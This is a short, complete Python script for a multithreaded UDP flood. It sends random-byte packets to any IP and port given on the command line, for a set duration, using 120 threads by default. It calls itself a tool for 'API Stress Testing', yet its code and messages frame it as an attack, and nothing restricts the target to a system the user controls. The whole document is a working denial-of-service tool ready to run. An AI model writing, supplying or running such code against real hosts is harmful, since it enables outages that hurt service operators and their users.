import socket
import time
import random
import threading
import argparse

def udp_attack(target_ip, target_port, duration, packet_size=512):
    timeout = time.time() + duration
    sent = 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            data = random._urandom(packet_size)
            sock.sendto(data, (target_ip, target_port))
            sent += 1
            print(f"\rPackets sent: {sent}", end="")
        print("\nAttack completed successfully!")
    except Exception as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description='UDP Flooder for API Stress Testing')
    parser.add_argument('ip', type=str, help='Target IP address (e.g., 127.0.0.1)')
    parser.add_argument('port', type=int, help='Target port number (e.g., 8080)')
    parser.add_argument('time', type=int, help='Attack duration in seconds')
    parser.add_argument('--size', type=int, default=512, help='Packet size in bytes (default: 512)')
    parser.add_argument('--threads', type=int, default=120, help='Number of threads (default: 120)')
    
    args = parser.parse_args()

    print(f"[+] Starting UDP flood on {args.ip}:{args.port} for {args.time} seconds")
    
    threads = []
    for _ in range(args.threads):
        thread = threading.Thread(target=udp_attack, args=(args.ip, args.port, args.time, args.size))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
